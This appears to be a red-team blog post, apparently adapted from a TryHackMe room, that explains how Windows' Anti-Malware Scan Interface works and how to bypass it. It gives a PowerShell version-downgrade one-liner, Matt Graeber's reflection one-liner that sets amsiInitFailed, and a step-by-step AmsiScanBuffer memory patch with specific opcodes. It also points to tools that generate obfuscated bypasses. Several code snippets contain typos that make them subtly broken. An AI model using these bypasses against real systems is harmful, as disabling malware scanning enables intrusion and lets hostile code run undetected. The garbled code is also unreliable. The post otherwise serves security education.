---
layout: post
title: "Breaking Through AMSI: Bypassing Runtime Detection in Windows"
date: 2025-08-26
categories: [Red Team,AMSI,Malware Analysis,Malware Development,C Sharp Programming,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

#### **Runtime Detections**

When executing code or applications, it will almost always flow through a runtime, no matter the interpreter. This is most commonly seen when using Windows API calls and interacting with .NET. The **CLR (Common Language Runtime)** and **DLR (Dynamic Language Runtime)** are the runtimes for .NET and are the most common you will encounter when working with Windows systems. In this article, we will not discuss the specifics of runtimes; instead, we will discuss how they are monitored and malicious code is detected.

A runtime detection measure will scan code before execution in the runtime and determine if it is malicious or not. Depending on the detection measure and technology behind it, this detection could be based on string signatures, heuristics, or behaviors. If code is suspected of being malicious, it will be assigned a value, and if within a specified range, it will stop execution and possibly quarantine or delete the file/code.

Runtime detection measures are different from a standard anti-virus because they will scan directly from memory and the runtime. At the same time, anti-virus products can also employ these runtime detections to give more insight into the calls and hooks originating from code. In some cases, anti-virus products may use a runtime detection stream/feed as part of their heuristics.

We will primarily focus on **AMSI (Anti-Malware Scan Interface)** in this article. **AMSI** is a runtime detection measure shipped natively with Windows and is an interface for other products and solutions.

* * *

#### **AMSI Overview**

**AMSI (Anti-Malware Scan Interface)** is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. From **Microsoft**: “The Windows Antimalware Scan Interface (**AMSI**) is a versatile interface standard that allows your applications and services to integrate with any anti-malware product that’s present on a machine. **AMSI** provides enhanced malware protection for your end-users and their data, applications, and workloads.”

For more information about AMSI, check out the [**Windows docs**](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)**.**

AMSI will determine its actions from a response code as a result of monitoring and scanning. Below is a list of possible response codes:

> • **AMSI\_RESULT\_CLEAN = 0**

> • **AMSI RESULT\_NOT\_DETECTED = 1**

> • **AMSI RESULT\_BLOCKED\_BY\_ADMIN\_START = 16384**

> • **AMSI\_RESULT\_BLOCKED\_BY\_ADMIN\_END=20479**

> • **AMSI RESULT\_DETECTED = 32768**

These response codes will only be reported on the backend of AMSI or through third-party implementation. If AMSI detects a malicious result, it will halt execution and send the below error message.

> **AMSI Error Response**

> **PS C:Users\\Tryhackme&gt; ‘Invoke-Hacks’**

> **At line:1 char:1**

> **+ “Invoke-Hacks”**

> **This script contains malicious content and has been blocked by your antivirus software.**

> **+ CategoryInfo**

> **+ FullyQualifiedErrorId**

> **: ParserError: (:) \[]. ParentContainsErrorRecordException ScriptContained MaliciousContent**

AMSI is fully integrated into the following Windows components:

> • **User Account Control, or UAC**

> • **PowerShell**

> • **Windows Script Host (wscript and cscript)**

> • **JavaScript and VBScript**

> • **Office VBA macros**

As attackers, when targeting the above components, we will need to be mindful of AMSI and its implementations when executing code or abusing components.

In the next task, we will cover the technical details behind how AMSI works and is instrumented in Windows.

* * *

#### **AMSI Instrumentation**

The way AMSI is instrumented can be complex, including multiple DLLs and varying execution strategies depending on where it is instrumented. By definition, AMSI is only an interface for other anti-malware products; AMSI will use multiple provider DLLs and API calls depending on what is being executed and at what layer it is being executed.

AMSI is instrumented from **System.Management.Automation.dll**, a .NET assembly developed by Windows; From the Microsoft docs, “Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications.” The .NET assembly will instrument other DLLs and API calls depending on the interpreter and whether it is on disk or memory. The below diagram depicts how data is dissected as it flows through the layers and what DLLS/API calls are being instrumented.

![](https://cdn-images-1.medium.com/max/800/1*wme0cn0c357TAM0I8k5agA.jpeg)

In the above graph data will begin flowing dependent on the interpreter used (PowerShell/VBScript/etc.) Various API calls and interfaces will be instrumented as the data flows down the model at each layer. It is important to understand the complete model of AMSI, but we can break it down into core components, shown in the diagram below.

![](https://cdn-images-1.medium.com/max/800/1*DBiEACxxXJ8BusZTPo5CRg.png)

**Note**: AMSI is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on **disk** **MsMpEng.exe (Windows Defender**) is already being instrumented.

Most of our research and known bypasses are placed in the Win32 API layer, manipulating the **AmsiScanBuffer** API call.

You may also notice the “**Other Applications**” interface from **AMSI**. Third-parties such as AV providers can instrument AMSI from their products. Microsoft documents **AMSI functions** and the **AMSI stream interface**.

We can break down the code for AMSI PowerShell instrumentation to better understand how it is implemented and checks for suspicious content. To find where AMSI is instrumented, we can use **Insecure PowerShell** maintained by **Cobbr**. Insecure PowerShell is a GitHub fork of PowerShell with security features removed; this means we can look through the compared commits and observe any security features. AMSI is only instrumented in twelve lines of code under **src/System.Management.Automation/engine/runtime/compiledScriptBlock.cs**. These twelve lines are shown below.

> **var scriptExtent = scriptBlockAst.Extent;**

> **if (AmsiUtils.ScanContent (scriptExtent.Text, scriptExtent.File) ==**

> **AmsiUtils. AmsiNativeMethods.AMSI RESULT.AMSI\_RESULT\_DETECTED)**

> **{**

> **var parseError = new ParseError(scriptExtent, “ScriptContainedMaliciousContent”, ParserStrings. ScriptContained MaliciousContent);**

> **}**

> **throw new ParseException (new\[] { parseError });**

> **if (ScriptBlock. CheckSuspiciousContent (scriptBlockAst) != null)**

> **{**

> **HasSuspiciousContent = true;**

> **}**

We can take our knowledge of how AMSI is instrumented and research from others to create and use bypasses that abuse and evade AMSI or its utilities.

* * *

#### **PowerShell Downgrade**

The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features. Most PowerShell sessions will start with the most recent PowerShell engine, but attackers can manually change the version with a one-liner. By “downgrading” the PowerShell version to 2.0, you bypass security features since they were not implemented until version 5.0.

The attack only requires a one-liner to execute in our session. We can launch a new PowerShell process with the flags **-Version** to specify the version (2).

> **PowerShell -Version 2**

This attack can actively be seen exploited in tools such as **Unicorn**.

> **full attack = ‘’’powershell /w 1 /C “sv (0) -;sv (1) ec;sv (2) ((gv (3}).value.toString()+(gv{4}).value.toString()); powershell (gv (5)).value.toString() (\\\\’.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha\_av + “)”**

Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.

The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.

* * *

#### **PowerShell Reflection**

Reflection allows a user or administrator to access and interact with .NET assemblies. From the **Microsoft** docs, “Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications.” .NET assemblies may seem foreign; however, we can make them more familiar by knowing they take shape in familiar formats such as **exe** (executable) and **dll** (dynamic-link library).

PowerShell reflection can be abused to modify and identify information from valuable DLLs.

The AMSI utilities for PowerShell are stored in the **AMSIUtils** .NET assembly located in **System.Management.Automation.Amsiutils**

**Matt Graeber** published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.

> **\[Ref] Assembly.GetType(‘System.Management. Automation.AmsiUtils’).GetField(‘amsiInitFailed’, ‘Non Public, Static’).SetValue($null, Strue)**

To explain the code functionality, we will break it down into smaller sections.

First, the snippet will call the reflection function and specify it wants to use an assembly from **\[Ref.Assembly]** it will then obtain the type of the AMSI utility using **GetType**

> **\[Ref] Assembly.GetType(‘System.Management. Automation.AmsiUtils’)**

The information collected from the previous section will be forwarded to the next function to obtain a specified field within the assembly using **GetField**

> **GetField(‘amsiInitFailed’, ‘NonPublic, Static’)**

The assembly and field information will then be forwarded to the next parameter to set the value from **$false** to **$true** using **Setvalue**

> **.SetValue($null, $true)**

Once the **amsiInitFailed** field is set to **$true**, AMSI will respond with the response code: **AMSI\_RESULT\_NOT\_DETECTED = 1**

* * *

#### **Patching AMSI**

AMSI is primarily instrumented and loaded from **amsi.dll** this can be confirmed from the diagram we observed earlier. This **dll** can be abused and forced to point to a response code we want. The **AmsiScanBuffer** function provides us the hooks and functionality we need to access the pointer/buffer for the response code.

**AmsiScanBuffer** is vulnerable because **amsi**.**dll** is loaded into the PowerShell process at startup; our session has the same permission level as the utility.

**AmsiScanBuffer** will scan a “**buffer**” of suspected code and report it to **amsi**.**dll** to determine the response. We can control this function and overwrite the buffer with a clean return code. To identify the buffer needed for the return code, we need to do some reverse engineering; luckily, this research and reverse engineering have already been done. We have the exact return code we need to obtain a clean response!

We will break down a code snippet modified by **BC-Security** and inspired by **Tal Liberman**. **RastaMouse** also has a similar bypass written in C# that uses the same technique.

At a high-level AMSI patching can be broken up into four steps:

> **1.** Obtain handle of **amsi.dll**

> 2. Get process address of **AmsiScanBuffer**

> 3. Modify memory protections of **AmsiScanBuffer**

> 4. Write opcodes to **AmsiScanBuffer**

We first need to load in any external libraries or API calls we want to utilize; we will load **GetProcAddress**, **GetModuleHandle**, and **VirtualProtect** from **kernel32** using **p/invoke**.

> **\[DLLImport(“”kernel32")] // Import DLL where API call is stored**

> **public static extern IntPtr GetProcAddress( // API Call to import**

> **IntPtr hModule, // Handle to DLL module**

> **string procName // function or variable to obtain**

> **);**

> **\[DILImport(“kernel32”)]**

> **public static extern IntPtr GetModuleHandle(**

> **string IpModuleName // Module to obtain handle**

> **);**

> **\[DllImport(“kernel32” “)]**

> **public static extern bool VirtualProtect(**

> **IntPtr lpAddress, // Address of region to Modify**

> **UIntPtr dwSize, // Size of region**

> **utnt flNewProtect, // Memory protection options**

> **out uint lpfl0ldProtect // Pointer to store previous protection options**

> **);**

The functions are now defined, but we need to load the API calls using **Add-Type**. This cmdlet will load the functions with a proper type and namespace that will allow the functions to be called.

> **$Kernel32 = Add-Type Member Definition MethodDefinition -Name ‘Kernel32’ -NameSpace ‘Win32’ -PassThru;**

Now that we can call our API functions, we can identify where **amsi.dll** is located and how to get to the function. First, we need to identify the process handle of AMSI using **GetModuleHandle**. The handle will then be used to identify the process address of **AmsiScanBuffer** using **GetProcAddress**

> **$handle \[Win32.Kernel32]::GetModuleHandle{**

> **‘amsi.dll’ // Obtains handle to amsi.dll**

> **}:**

> **\[IntPtr $BufferAddress = \[Win32.Kernel32]::GetProcAddress{**

> **$handle, // Handle of amsi.dll**

> **‘AmsiScanBuffer’ // API call to obtain**

> **};**

Next, we need to modify the memory protection of the **AmsiScanBuffer** process region. We can specify parameters and the buffer address for **VirtualProtect**

Information on the parameters and their values can be found from the previously mentioned API documentation.

> **\[UInt32] $Size = 0x5; // Size of region**

> **\[UInt32] $ProtectFlag= 0x40; // PAGE\_EXECUTE\_READWRITE**

> **\[UInt32] $0ldProtectFlag= 0; // Arbitrary value to store options**

> **\[Win32 Kernel32]: VirtualProtect(**

> **$BufferAddress, // Point to AnsiScanBuffer**

> **$Size, // Size of region**

> **$ProtectFlag, // Enables R or RW access to region**

> **\[Ref] $OldProtectFlag // Pointer to store old options**

We need to specify what we want to overwrite the buffer with; the process to identify this buffer can be found here. Once the buffer is specified, we can use **marshal copy** to write to the process.

> **$buf = \[Byte\[]](\[UInt32]0xB8, \[UInt32]0x57, \[UInt32]0x00, \[Uint32]0x07, \[Uint32]0x80, \[Vint32]0xC3);**

> **\[system.runtime.interopservices.marshal]::copy{**

> **$buf, // Opcodes/array to write**

> **0, // Where to start copying in source array**

> **$BufferAddress, // Where to write (AsmiScanBuffer)**

> **6 //Number of elements/opcodes to write**

> **};**

At this stage, we should have an AMSI bypass that works! It should be noted that with most tooling, signatures and detections can and are crafted to detect this script.

* * *

#### **Automating for Fun and Profit**

While it is preferred to use the previous methods shown in this room, attackers can use other automated tools to break AMSI signatures or compile a bypass. The first automation tool we will look at is **amsi.fail**

**amsi.fail** will compile and generate a PowerShell bypass from a collection of known bypasses. From amsi.fail, “AMSI fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before obfuscating. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.”

**AMSITrigger** allows attackers to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because you are making the file itself clean.

The syntax for using amsitrigger is relatively straightforward; you need to specify the file or URL and what format to scan the file. Below is an example of running amsitrigger.

AMSI Trigger Example:

![](https://cdn-images-1.medium.com/max/800/1*qI1zQtteq-FTKUPvkoWuQg.png)

Signatures are highlighted in red; you can break these signatures by encoding, obfuscating, etc.

By [Moataz Osama](https://medium.com/@mezo512) on [March 8, 2025](https://medium.com/p/8fb96d90f8e2).

[Canonical link](https://medium.com/@mezo512/breaking-through-amsi-bypassing-runtime-detection-in-windows-8fb96d90f8e2)

Exported from [Medium](https://medium.com) on August 26, 2025.